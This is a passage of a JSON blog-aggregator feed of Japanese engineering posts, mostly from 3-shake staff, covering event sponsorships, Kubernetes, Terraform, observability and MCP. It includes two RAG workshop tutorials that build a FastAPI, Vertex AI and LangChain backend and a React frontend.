2025」にGoldスポンサーとして協賛およびブース出展","link":"https://sreake.com/blog/kubecon-cloudnativecon-japan-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 2025年6月16日（月）・17日（火）に開催される「KubeCon + CloudNativeCon Japan 2025」にGoldスポンサーとして協賛します。The post スリーシェイク、「KubeCon + CloudNativeCon Japan 2025」にGoldスポンサーとして協賛およびブース出展 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-29T01:00:00.000Z","dateMiliSeconds":1748480400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Dockerを使用せずにイメージを作成し実行してみる – go-containerregistryによる実装","link":"https://sreake.com/blog/image-creation-and-execution-with-go-containerregistry/","contentSnippet":"この記事ではコンテナイメージがどのように作成されているのかを、go-containerregistryライブラリを使った実装例を通して解説します。Dockerfileを使わずに、プログラムからコンテナイメージを作成する過 […]The post Dockerを使用せずにイメージを作成し実行してみる – go-containerregistryによる実装 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-29T00:40:36.000Z","dateMiliSeconds":1748479236000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、Google Cloud Next Tokyo にDiamondスポンサーとして協賛","link":"https://sreake.com/blog/google-cloud-next-tokyo-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2025 年 8 ⽉ 5 日（火）~\xa0 6 ⽇（水）に東京ビッグサイトにて開催される Google Cloud Next Tokyo\xa0 (主催：グーグル・クラウド・ジャパン合同会社) にDiamondスポンサーとして協賛いたします。The post スリーシェイク、Google Cloud Next Tokyo にDiamondスポンサーとして協賛 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-28T06:27:59.000Z","dateMiliSeconds":1748413679000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AIコードエディタは開発を変えるか？Cursorをチームに導入して1ヶ月経った本音","link":"https://speakerdeck.com/ota1022/aikodoedeitahakai-fa-wobian-eruka-cursorwotimunidao-ru-site1keyue-jing-tutaben-yin","contentSnippet":"2025年5月28日 Qiita Bash 最近ハマっている生成AI活用法を語ろう！のLT登壇資料です。\\rhttps://increments.connpass.com/event/351227/","isoDate":"2025-05-28T04:00:00.000Z","dateMiliSeconds":1748404800000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"ディレクトリ構成 ~フィーチャーベース編~","link":"https://sreake.com/blog/feature-based-directory-structure-good-practice/","contentSnippet":"はじめに アプリケーション開発において、ディレクトリ構成は保守性・拡張性・開発効率に直結する設計要素です。 本記事では、以下のような課題に悩む現場に向けて、「機能ごとに整理しやすく、拡張にも強い」フィーチャーベース構成を […]The post ディレクトリ構成 ~フィーチャーベース編~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-28T02:18:09.000Z","dateMiliSeconds":1748398689000,"authorName":"Sreake","authorId":"Sreake"},{"title":"RedisのPub/Subを使用したリアルタイム通知の実現","link":"https://sreake.com/blog/realtime-notification-with-redis-pubsub/","contentSnippet":"はじめに Sreake事業部のアプリケーションエンジニアの角谷です。 リアルタイム通信を実現する手段は様々ありますが、その一つにPub/Subがあります。 Pub/Subを実装する方法は様々ありますが、今回はRedisを […]The post RedisのPub/Subを使用したリアルタイム通知の実現 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-28T01:18:04.000Z","dateMiliSeconds":1748395084000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、「開発生産性Conference 2025」にGoldスポンサーとして協賛およびブース出展・登壇","link":"https://sreake.com/blog/developer-productivity-conference-2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 2025年 7月3日（木）4日（金）に開催される「開発生産性Conference 2025」にGoldスポンサーとして協賛します。The post スリーシェイク、「開発生産性Conference 2025」にGoldスポンサーとして協賛およびブース出展・登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-27T01:00:00.000Z","dateMiliSeconds":1748307600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"RAGアプリ開発ハンズオン（後編：フロントエンド編）","link":"https://shu-kob.hateblo.jp/entry/2025/05/26/185645","contentSnippet":"genai-users.connpass.com上記ハンズオン勉強会の資料になります。前回資料shu-kob.hateblo.jp前回の課題retriever_service を定義しましたが、検索結果をcontextとして、LLMへの問い合わせを行なってください。llm_serviceでretriever_serviceを使うようにします。@app.post(\'/api/llm\')def llm_service(question: Question):    human_question = question.query    model = VertexAI(model_name=\\"gemini-2.0-flash-001\\", location=\\"us-west1\\")    template = \\"\\"\\"質問: {question}    ステップバイステップで考えてください。\\"\\"\\"    prompt_template = PromptTemplate.from_template(template)    chain = prompt_template | model # prompt_templateをmodelに引き渡す処理を\\"|\\"を用いて簡単に実現    response = chain.invoke({\\"question\\": human_question}) # invokeは全ての処理が終わってから値を返す。他にはstreamなど    print(response)    resp = { \'answer\': response }    return resp↓@app.post(\'/api/llm\')def llm_service(question: Question):    human_question = question.query    model = VertexAI(model_name=\\"gemini-2.0-flash-001\\", location=\\"us-west1\\")    context_resp = retriever_service(question)    context = context_resp[\'search_result\']    print(context)    template = \\"\\"\\"質問: {question}    以下の情報を参考にして、質問に答えてください。    {context}    \\"\\"\\"    prompt_template = PromptTemplate.from_template(template)    chain = prompt_template | model # prompt_templateをmodelに引き渡す処理を\\"|\\"を用いて簡単に実現    response = chain.invoke({\\"question\\": human_question, \\"context\\": context}) # invokeは全ての処理が終わってから値を返す。他にはstreamなど    print(response)    resp = { \'answer\': response }    return resp以下も行っておくと便利です。.envを作成DISCOVERY_ENGINE_ID=XXXXXXXXXXXXX以下の行を main.pyに追記from dotenv import load_dotenvload_dotenv()engine_idの行を変更@app.post(\'/api/retriever\')def retriever_service(question: Question):    search_query = question.query    project_id    location: str = \\"global\\"    engine_id: str = \'DISCOVERY_ENGINE_ID\'↓@app.post(\'/api/retriever\')def retriever_service(question: Question):    search_query = question.query    project_id    location: str = \\"global\\"    engine_id: str = os.environ[\'DISCOVERY_ENGINE_ID\']動作確認QUESTION=\'{\\"query\\":\\"情報セキュリティにおいて気をつけるべきことを教えてください\\"}\'curl -X POST -H \\"Content-Type: application/json\\" -d \\"$QUESTION\\" -s http://localhost:8000/api/llm | jq .参考）ソースコード差分retriever_serviceで得た検索結果をcontextに by shu-kob \xb7 Pull Request #4 \xb7 shu-kob/rag-app-handson \xb7 GitHubフロントエンドの実装フォルダ整理これまでバックエンドを追加してきたのと同じリポジトリでフロントエンドも管理いたします。そのためにこれまで追加してきたファイルをバックエンド用のフォルダに移動させます。mkdir backend# 下記以外にも必要なファイル、フォルダはbackendに移動してください。# - __pycache__とfastapi-envは削除してください。# - .gitがある場合は移動も削除もしないでください。mv *.md *.py *.txt .env backendアプリ作成アプリの雛形を作成し、起動を確認します。npx --yes create-react-router@latest --install --no-git-init frontendcd frontendnpm run devブラウザでhttp://localhost:5173/を開いてReact Routerの画面が表示されればOKです。画面を変更してみる見た目を定義しているコンポーネントはfrontend/app/welcome/welcome.tsxです。Welcomeコンポーネントを以下のように変更します。export function Welcome() {  return (    <main className=\\"flex items-center justify-center pt-16 pb-4\\">      <div className=\\"flex-1 flex flex-col items-center gap-16 min-h-0\\">        <div>          <div>            <label htmlFor=\\"message\\">メッセージ</label>          </div>          <div>            <textarea              id=\\"message\\"              rows={4}              cols={50}              style={{                padding: \\"0.5rem\\",                border: \\"1px solid #ccc\\",                outline: \\"none\\",                boxShadow: \\"none\\",              }}            />          </div>          <div>            <button              type=\\"button\\"              style={{                border: \\"1px solid #ccc\\",                padding: \\"0.5rem 1rem\\",              }}            >              送信            </button>          </div>        </div>      </div>    </main>  );}画面に入力欄とボタンが表示されればOKです。入力をコントロールする上記で入力欄に文字を入力することはできますが、その値はブラウザ側で管理されており、Reactアプリ側では取得できません。そこでstateを用いてアプリ側で入力を制御します。import { useState } from \\"react\\";export function Welcome() {  const [input, setInput] = useState(\\"\\");  const onSend = () => {    console.log(input)  }  return (    <main className=\\"flex items-center justify-center pt-16 pb-4\\">      <div className=\\"flex-1 flex flex-col items-center gap-16 min-h-0\\">        <div>          <div>            <label htmlFor=\\"message\\">メッセージ</label>          </div>          <div>            <textarea              id=\\"message\\"              rows={4}              cols={50}              style={{                padding: \\"0.5rem\\",                border: \\"1px solid #ccc\\",                outline: \\"none\\",                boxShadow: \\"none\\",              }}              value={input}              onChange={(e) => setInput(e.target.value)}            />          </div>          <div>            <button              type=\\"button\\"              style={{                border: \\"1px solid #ccc\\",                padding: \\"0.5rem 1rem\\",              }}              onClick={onSend}            >              送信            </button>          </div>        </div>      </div>    </main>  );}テキストを入力して送信ボタンをクリックするとログにテキストの内容が表示されるようになります。ログの確認はブラウザの開発者ツールで行います。バックエンドとの接続フロントエンドはバックエンドと異なるオリジンで動かしているため、CORSエラーにならないようバックエンドを修正します。backend/main.pyに以下を追加してください。# CORSミドルウェアの設定from fastapi.middleware.cors import CORSMiddlewareapp.add_middleware(    CORSMiddleware,    allow_origins=[\\"*\\"],  # すべてのオリジンを許可    allow_credentials=True,    allow_methods=[\\"*\\"],  # すべてのメソッドを許可    allow_headers=[\\"*\\"],  # すべてのヘッダーを許可    expose_headers=[\\"*\\"]  # すべてのヘッダーを公開)変更後、バックエンドを起動します。python -m venv fastapi-envsource fastapi-env/bin/activateWindowsのコマンドプロンプトの場合fastapi-env/Scripts/activateuvicorn main:app --reload送信ボタンが押された際に入力されたテキストをバックエンドに送信し、生成AIの回答を取得できるようにします。レスポンスの確認はブラウザの開発者ツールで行います。  const onSend = () => {    fetch(\\"http://localhost:8000/api/llm\\", {      method: \\"POST\\",      headers: {        \\"Content-Type\\": \\"application/json\\",      },      body: JSON.stringify({ query: input }),    })  }演習バックエンドのResponseを画面に表示させましょう例バックエンドからのresponseをフロントエンドに表示 by shu-kob \xb7 Pull Request #6 \xb7 shu-kob/rag-app-handson \xb7 GitHub","isoDate":"2025-05-26T09:56:45.000Z","dateMiliSeconds":1748253405000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Vertex AI Agent Engine のカスタムテンプレートでセッション機能付きチャットボットを作る","link":"https://zenn.dev/kimitsu/articles/agent-angine-custom-agent","contentSnippet":"Vertex AI Agent Engine は AI エージェントを構築・デプロイするための Google Cloud のマネージドサービスです。[1]以下のフレームワークに対してはテンプレートが用意されており、簡単にデプロイすることができます。Agent Development KitLangChainLangGraphAG2LlamaIndexまた上記に挙げられていないフレームワークについても、カスタムテンプレートを作成することでデプロイすることができます。今回はカスタムテンプレートを用いて、セッション機能付きの AI チャットボットを実装してみます。なお本記...","isoDate":"2025-05-26T07:02:31.000Z","dateMiliSeconds":1748242951000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"TerragruntでTerraformをいい感じに管理する","link":"https://zenn.dev/kojake_300/articles/9b008349fa8310","contentSnippet":"はじめに皆さんはTerraformをどのような管理していますか？最近では、Google Cloudがベストプラクティス[1]を公開していたり、FUTURE社が設計ガイドライン[2]を提供していたりと、Terrafromの設計・開発ガイドラインは成熟して来ているのではないでしょうか。それでも、何となくもっと良い管理の方法はないかなあ？ と思ったことはありませんか。そんなTerraform Loverに送る、Terragruntというツールを紹介します。 Terraformの課題基本的なTerraformのディレクトリ構成を以下に示します。AWSリソースを管理することを想定と...","isoDate":"2025-05-25T14:05:00.000Z","dateMiliSeconds":1748181900000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Google Cloud の生成 AI オブザーバビリティ機能まとめ","link":"https://zenn.dev/kimitsu/articles/google-cloud-gen-ai-o11y","contentSnippet":"生成 AI アプリケーションにおけるオブザーバビリティの必要性ここ数年の生成 AI 技術の発展に伴い、RAG や AI エージェントなど生成 AI のアプリケーションへの応用が進んでいます。一方で生成 AI アプリケーションを本番利用していくにあたっては以下のような課題があります。確率的な挙動モデルの出力生成にかかる時間トークンに対する課金額外部サービス呼び出し（RAG であれば検索サービス、AI エージェントであればツール）実行経路（ワークフロー型エージェントの場合）モデルの更新、プロンプトの更新これらの課題に対し、生成 AI アプリケーションにおいて...","isoDate":"2025-05-24T09:01:25.000Z","dateMiliSeconds":1748077285000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Snowflakeで始めるデータガバナンス","link":"https://sreake.com/blog/getting-started-with-data-governance-in-snowflake/","contentSnippet":"はじめに データ分析において、データガバナンスは必要不可欠な取り組みの1つと言って過言ではないでしょう。 今回は「Snowflakeで始めるデータガバナンス」と題しまして、新規既存関係なく、どのタイミングからでも導入可能 […]The post Snowflakeで始めるデータガバナンス first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-23T01:15:59.000Z","dateMiliSeconds":1747962959000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【小ネタ】Linux 6.15でExFATのファイル削除が高速化された話","link":"https://dev.mix64.com/2025/05/22/linux6-15-exfat/","contentSnippet":"今回はLinux 6.15で高速化されたexFATのファイル削除処理について、ソースコードベースで改善点を解説します。 結論 だれも使わない...","isoDate":"2025-05-21T16:01:03.000Z","dateMiliSeconds":1747843263000,"authorName":"ayibote","authorId":"ayibote"},{"title":"Pod Resource動的リサイズの検証","link":"https://sreake.com/blog/kubernetes-pod-resource-dynamic-resize/","contentSnippet":"Kubernetesでは、アプリケーションの可用性や運用効率を高めるため、リソース変更時のダウンタイムを極力抑える取り組みが進んでいます。従来、CPU やメモリのリソースを変更する際には、Pod の再作成やコンテナ再起動 […]The post Pod Resource動的リサイズの検証 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-20T08:38:25.000Z","dateMiliSeconds":1747730305000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【ドキュメントを追え! mitmproxy編】 第1話 いかにして中間者になるかHTTP編","link":"https://www.rowicy.com/blog/mitmproxy-doc-read-01/","contentSnippet":"mitmproxyのドキュメントを読んで自分で調べた補足をまとめました","isoDate":"2025-05-20T00:00:00.000Z","dateMiliSeconds":1747699200000,"authorName":"riiim","authorId":"riiim"},{"title":"React Tokyo LT大会「ストリームの実装」","link":"https://speakerdeck.com/shukob/react-tokyo-ltda-hui-sutorimunoshi-zhuang","contentSnippet":"2025年5月17日React Tokyo LT大会にて、生成AIアプリケーションなどでよく使う「ストリーム実装」について話しました。\\rhttps://react-tokyo.connpass.com/event/350715/","isoDate":"2025-05-17T04:00:00.000Z","dateMiliSeconds":1747454400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google CloudのAI Agent関連のサービス紹介","link":"https://speakerdeck.com/shukob/google-cloudnoai-agentguan-lian-nosabisushao-jie","contentSnippet":"https://3-shake.connpass.com/event/351861/\\r3-shake SRE Tech Talk #12 にて、\\rGoogle CloudのAI Agent関連のサービス紹介を行いました\\r・Vertex AI Agent Builder\\r・Agent Garden\\r・Agent Engine\\r・Vertex AI Search\\r・Agentspace\\rなど","isoDate":"2025-05-16T04:00:00.000Z","dateMiliSeconds":1747368000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"学ぶ・つながる・挑戦する ~ 大学から始めるセキュリティの学び~/security_learning","link":"https://speakerdeck.com/moz_sec_/security-learning","contentSnippet":"2025年5月15日に行われたランチタイムトークで登壇した資料です。","isoDate":"2025-05-15T04:00:00.000Z","dateMiliSeconds":1747281600000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"転職したらMCPサーバーだった件","link":"https://speakerdeck.com/nwiizo/zhuan-zhi-sitaramcpsabadatutajian","contentSnippet":"本日、Forkwell さんに悪ふざけに付き合ってもらってイベントやりました。ありがとうございます。「転職したらMCPサーバーだった件」 \uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: 転職したらMCPサーバーだった件\\r- 公式URL: https://forkwell.connpass.com/event/354289/\\r- ハッシュタグ: https://x.com/search?q=%23Forkwell_MCP&f=live\\r- 参考資料①: https://speakerdeck.com/nwiizo/kokohamcpnoye-ming-kemae\\r- 参考資料②: https://syu-m-5151.hatenablog.com/entry/2025/03/09/020057\\r- 参考資料③: https://speakerdeck.com/superbrothers/that-time-i-changed-jobs-as-a-kubernetes","isoDate":"2025-05-15T04:00:00.000Z","dateMiliSeconds":1747281600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"AIエージェントのオブザーバビリティについて","link":"https://speakerdeck.com/yunosukey/aiezientonoobuzababiriteinituite","contentSnippet":"","isoDate":"2025-05-15T04:00:00.000Z","dateMiliSeconds":1747281600000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"論文紹介『長文コンテキストLLMとRAGの連携：RAGにおける長文入力の課題克服』","link":"https://sreake.com/blog/introduction-long-context-llms-meet-rag/","contentSnippet":"RAG（Retrieval Augmented Generation）は、LLM（Large Language Model：大規模言語モデル）が知らない情報を外部から与えてあげることで、LLMの知識を拡張する手法です。R […]The post 論文紹介『長文コンテキストLLMとRAGの連携：RAGにおける長文入力の課題克服』 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-15T01:01:02.000Z","dateMiliSeconds":1747270862000,"authorName":"Sreake","authorId":"Sreake"},{"title":"OpenTelemetry + LLM = OpenLLMetry!?","link":"https://speakerdeck.com/yunosukey/opentelemetry-plus-llm-equals-openllmetry","contentSnippet":"","isoDate":"2025-05-14T04:00:00.000Z","dateMiliSeconds":1747195200000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"SSHの基本を理解したい(シーケンス図付き)","link":"https://zenn.dev/meziron/articles/a42cef62e06a68","contentSnippet":"1. 初回 SSH 接続時の流れ (秘密鍵のパスフレーズ入力あり)このシナリオでは、ユーザーが初めて特定のサーバーに SSH 接続を試みるか、あるいは SSH エージェントにまだ該当の秘密鍵がロードされていない状況を想定します。秘密鍵はパスフレーズで保護されているものとします。 登場人物User: 操作を行うユーザーSSH_Client: ユーザーが操作する SSH クライアント（例: sshコマンド）SSH_Agent: SSH エージェントプロセス（秘密鍵をメモリに保持）SSH_Server: 接続先の SSH サーバー 初回接続時の流れのポイント...","isoDate":"2025-05-12T00:00:05.000Z","dateMiliSeconds":1747008005000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"GitHub Actionsから踏み台経由でプライベートCloud SQLに接続 (OS Login + WIF + SSHトンネル編)","link":"https://zenn.dev/meziron/articles/369504c9d84eba","contentSnippet":"GitHub Actionsから踏み台サーバー経由でプライベートCloud SQLに接続する実践ガイド (OS Login + WIF + SSHトンネル編)CI/CDパイプライン、特にGitHub Actionsから、VPCのプライベートネットワーク内に配置されたCloud SQLデータベースへ安全かつ自動的に接続したい、というニーズは多いのではないでしょうか？この記事では、Workload Identity Federation (WIF), OS Login そして gcloud compute ssh (beta) を組み合わせた、管理しやすい接続方法を解説します。 1...","isoDate":"2025-05-08T08:55:26.000Z","dateMiliSeconds":1746694526000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"クラウドネイティブ環境の脅威モデリング","link":"https://speakerdeck.com/kyohmizu/kuraudoneiteibuhuan-jing-noxie-wei-moderingu","contentSnippet":"イベント登壇資料です。2025/05/08 #TMCTokyo\\rhttps://lu.ma/tmc-tokyo-meetup-2025-05","isoDate":"2025-05-08T04:00:00.000Z","dateMiliSeconds":1746676800000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"FastAPIのエラーハンドリングの基本と、ハンドリング漏れ対策","link":"https://sreake.com/blog/fastapi-error-handling-basics/","contentSnippet":"こんにちは。Sreake事業部の安本篤史（atusy）です。 APIサーバーの実装では、プログラムエラーをハンドリングして、クライアントエラーやサーバーエラーを適切にレスポンスすることが求められます。 同時に、エラーに関 […]The post FastAPIのエラーハンドリングの基本と、ハンドリング漏れ対策 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-05-08T03:03:29.000Z","dateMiliSeconds":1746673409000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Argo CDのセットアップ方法を解説してみる","link":"https://zenn.dev/kamos/articles/0e1e6af0700f14","contentSnippet":"はじめにArgo CDとは、Kubernetesのための継続的デリバリー（CD）ツールです。GitOpsの原則に従い、Gitリポジトリの状態をKubernetesクラスターに同期させることができます。これにより、アプリケーションのデプロイメントや管理が容易になります。Kubernetes環境では広く利用されているArgo CDですが、Argo CD自体のセットアップ方法はいくつかの方法があります。ここでは、Argo CDの初期セットアップについて解説します。 Argo CDの初期セットアップArgo CDを利用可能にするには、以下の手順が必要になります。Argo CD ...","isoDate":"2025-05-07T02:18:03.000Z","dateMiliSeconds":1746584283000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"A2AサーバをOpenTelemetryで計装する","link":"https://zenn.dev/kimitsu/articles/otel-and-a2a","contentSnippet":"A2A におけるオブザーバビリティの必要性A2A[1]は Google が主導し開発を進めている、エージェント間の通信を可能にするオープンプロトコルです。A2A を利用することで生成 AI アプリケーションはマルチエージェントシステムとして実装されます。マルチエージェントシステムは分散システムであり、マイクロサービスと同様にオブザーバビリティが重要となります。小さなエージェントであればわざわざ A2A でクライアントとサーバに分ける必要はありませんが、エージェントが巨大化すれば従来の Web アプリケーションの潮流と同様に分割される方向で進化するでしょう。本記事ではA2Aサ...","isoDate":"2025-05-05T10:46:15.000Z","dateMiliSeconds":1746441975000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"MCPサーバをOpenTelemetryで計装する","link":"https://zenn.dev/kimitsu/articles/otel-and-mcp","contentSnippet":"MCP におけるオブザーバビリティの必要性MCP の利用方法として現時点では以下がよくあると思います。MCP サーバをローカルで動かしているサードパーティーのリモートサーバを使っているクライアントがローカルアプリ上記の場合にはオブザーバビリティは比較的重要ではありません。一方で、以下のような場合にはMCP においてもオブザーバビリティが重要です。Web アプリケーションが MCP クライアント（例えば生成 AI アプリ）MCP サーバを自作しているこのような状況では MCP クライアントと MCP サーバは、マイクロサービスで構成されたアプリケーションとして...","isoDate":"2025-05-05T07:33:24.000Z","dateMiliSeconds":1746430404000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"PR概要作成・コード改善提案ツール PR-Guardianのご紹介","link":"https://sreake.com/blog/pr-guardian-introduction/","contentSnippet":"はじめに はじめまして、Sreake事業部でインターンをしている村山です。 今回は、PR Guardianというツールの開発と検証をしました。PR GuardianはPull Requestの概要の作成、コードの改善提案 […]The post PR概要作成・コード改善提案ツール PR-Guardianのご紹介 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-30T08:07:36.000Z","dateMiliSeconds":1746000456000,"authorName":"Sreake","authorId":"Sreake"},{"title":"NVIDIA NIMを使ってみた","link":"https://sreake.com/blog/trying-out-nvidia-nim/","contentSnippet":"NIMとは NVIDIA Inference Microservicesの頭文字をとってNIMです。迅速なエンタープライズ対応デプロイメントのためのマイクロサービスを提供してくれます。NVIDIAのGPUで動かすことに最 […]The post NVIDIA NIMを使ってみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-30T06:13:57.000Z","dateMiliSeconds":1745993637000,"authorName":"Sreake","authorId":"Sreake"},{"title":"RustでLSMツリーを実装してみた","link":"https://zenn.dev/sraku/articles/25ead9b5012c15","contentSnippet":"概要CassandraやScyllaDBといったKVSで使用されているLSMツリーを簡単に実装してみたので、簡単にお話ししていきたいと思いますこちらがリポジトリですhttps://github.com/sraku2159/lsmtree実装のお話をする前に簡単にLSMツリーについてお話ししていきたいと思います LSMツリーとはLSMツリーとはLog Structre Merge ツリーの略で以下の四つのコンポーネントから構成されます。MemtableCommitLogSSTableコンパクション以下、ScyllaDBのちょー親切なドキュメントから拝借した画...","isoDate":"2025-04-29T10:09:14.000Z","dateMiliSeconds":1745921354000,"authorName":"Sota Nakano","authorId":"sraku"},{"title":"RAGアプリ開発ハンズオン（前編：バックエンド編）","link":"https://shu-kob.hateblo.jp/entry/2025/04/28/185621","contentSnippet":"genai-users.connpass.com上記ハンズオン勉強会の資料になります。ソースコードgithub.comFastAPIの準備python -m venv fastapi-envsource fastapi-env/bin/activateWindowsのコマンドプロンプトの場合fastapi-env/Scripts/activatepip install fastapi uvicorntouch main.pyfrom fastapi import FastAPIapp = FastAPI()@app.get(\'/\')def index():  return \'hello\'実行uvicorn main:app --reload別ターミナルにてcurl -s http://localhost:8000/POSTも追加from pydantic import BaseModelclass User(BaseModel):    name: str@app.post(\'/api/hello\')def hello_service(user: User):    resp = { \'message\': \'Hello, {}!\'.format(user.name) }    return respUSER=\'{\\"name\\":\\"平賀源内\\"}\'curl -X POST -H \\"Content-Type: application/json\\" -d \\"$USER\\" -s http://localhost:8000/api/hello | jq .Google Cloudでサービスアカウントの準備Geminiマルチモーダルプログラミングハンズオン - Toilを無くして徒然なるままに日暮し硯に向かひたいの記事を参考に、ロールへVertex AI ユーザーディスカバリー エンジン ユーザーを追加し、環境変数の設定Geminiを呼び出すコードを記載main.pyの上に以下を追加import vertexaifrom vertexai.generative_models import GenerativeModelmain.pyの下に以下を追加class Question(BaseModel):    query: str@app.post(\'/api/llm\')def llm_service(question: Question):    prompt = question.query    vertexai.init(location=\\"us-west1\\") # vertexaiの初期化で、ロケーションを設定    model = GenerativeModel(\\"gemini-2.0-flash-001\\") # モデルを設定    response = model.generate_content( # プロンプトをモデルに入れて出力(レスポンスを得る)        prompt    )    print(response.text) # コンソールログにresponseのテキストを表示    resp = { \'answer\': response.text } # responseを形作る    return respライブラリのインストールrequirements.txtに以下を記載google-cloud-aiplatform==1.83.0vertexai==1.43.0langchain_core==0.3.33langchain_google_vertexai==2.0.12google===3.0.0google-cloud-discoveryengine==0.13.6pip install -r requirements.txt--break-system-packagesをつけよ、とエラーが出たら以下pip install --user -r requirements.txt --break-system-packages実行方法uvicorn main:app --reload別ターミナルにてQUESTION=\'{\\"query\\":\\"プロンプトエンジニアリングとは何ですか？\\"}\'curl -X POST -H \\"Content-Type: application/json\\" -d \\"$QUESTION\\" -s http://localhost:8000/api/llm | jq .LangChainを用いるimport vertexai # 削除from vertexai.generative_models import GenerativeModel # 削除from langchain_google_vertexai import VertexAI # 追記from langchain_core.prompts import PromptTemplate # 追記@app.post(\'/api/llm\')def llm_service(question: Question):    human_question = question.query    model = VertexAI(model_name=\\"gemini-2.0-flash-001\\", location=\\"us-west1\\")    template = \\"\\"\\"質問: {question}    ステップバイステップで考えてください。\\"\\"\\"    prompt_template = PromptTemplate.from_template(template)    chain = prompt_template | model # prompt_templateをmodelに引き渡す処理を\\"|\\"を用いて簡単に実現    response = chain.invoke({\\"question\\": human_question}) # invokeは全ての処理が終わってから値を返す。他にはstreamなど    print(response)    resp = { \'answer\': response }    return respRAG構築Google Cloud Vertex AI Agent Builderの使い方 - Toilを無くして徒然なるままに日暮し硯に向かひたいの記事を参考に、Google Cloud Storageにドキュメントを格納し、Agent Builderで検索アプリを作ります。main.pyの上に追記from google.api_core.client_options import ClientOptionsfrom google.cloud import discoveryengine_v1 as discoveryengineimport osimport google.authcredentials, project_id = google.auth.default()main.pyの下に追記\'DISCOVERY_ENGINE_ID\'を書き換えます@app.post(\'/api/retriever\')def retriever_service(question: Question):    search_query = question.query    project_id    location: str = \\"global\\"    engine_id: str = \'DISCOVERY_ENGINE_ID\' # AI Applicationsで作成したアプリケーションのIDに変更する    def search(        project_id: str,        location: str,        engine_id: str,        search_query: str,    ) -> discoveryengine.services.search_service.pagers.SearchPager:        client_options = (            ClientOptions(api_endpoint=f\\"{location}-discoveryengine.googleapis.com\\")            if location != \\"global\\"            else None        )        client = discoveryengine.SearchServiceClient(client_options=client_options)        serving_config = f\\"projects/{project_id}/locations/{location}/collections/default_collection/engines/{engine_id}/servingConfigs/default_config\\"        content_search_spec = discoveryengine.SearchRequest.ContentSearchSpec(            snippet_spec=discoveryengine.SearchRequest.ContentSearchSpec.SnippetSpec(                return_snippet=True            ),            summary_spec=discoveryengine.SearchRequest.ContentSearchSpec.SummarySpec(                summary_result_count=3,                include_citations=True,                ignore_adversarial_query=True,                ignore_non_summary_seeking_query=True,                model_prompt_spec=discoveryengine.SearchRequest.ContentSearchSpec.SummarySpec.ModelPromptSpec(                    preamble=\\"文献の検索結果を要約してください\\"                ),                model_spec=discoveryengine.SearchRequest.ContentSearchSpec.SummarySpec.ModelSpec(                    version=\\"stable\\",                ),            ),        )        request = discoveryengine.SearchRequest(            serving_config=serving_config,            query=search_query,            page_size=3,            content_search_spec=content_search_spec,            query_expansion_spec=discoveryengine.SearchRequest.QueryExpansionSpec(                condition=discoveryengine.SearchRequest.QueryExpansionSpec.Condition.AUTO,            ),            spell_correction_spec=discoveryengine.SearchRequest.SpellCorrectionSpec(                mode=discoveryengine.SearchRequest.SpellCorrectionSpec.Mode.AUTO            ),        )        page_result = client.search(request)        return page_result    response = search(project_id, location, engine_id, search_query)    resp = { \'search_result\': response.summary.summary_text }    print(resp)    return respQUESTION=\'{\\"query\\":\\"情報セキュリティにおいて気をつけるべきことを教えてください\\"}\'curl -X POST -H \\"Content-Type: application/json\\" -d \\"$QUESTION\\" -s http://localhost:8000/api/retriever | jq .課題retriever_service を定義しましたが、検索結果をcontextとして、LLMへの問い合わせを行なってください。次回、5月の回（日程未定）で解説します。","isoDate":"2025-04-28T09:56:21.000Z","dateMiliSeconds":1745834181000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"AWS Load Balancer Controller (LBC)でkubernetesのServiceを外部に公開する","link":"https://zenn.dev/kamos/articles/65c7d16bf16184","contentSnippet":"はじめにAWS LBC(Load Balancer Controller)は、EKS上のリソースとしてALBを構成するための機能です。今回はこの機能の基本的な使い方や、より高度な構成について説明します。 AWS LBCとはなにかAWS LBC(Load Balancer 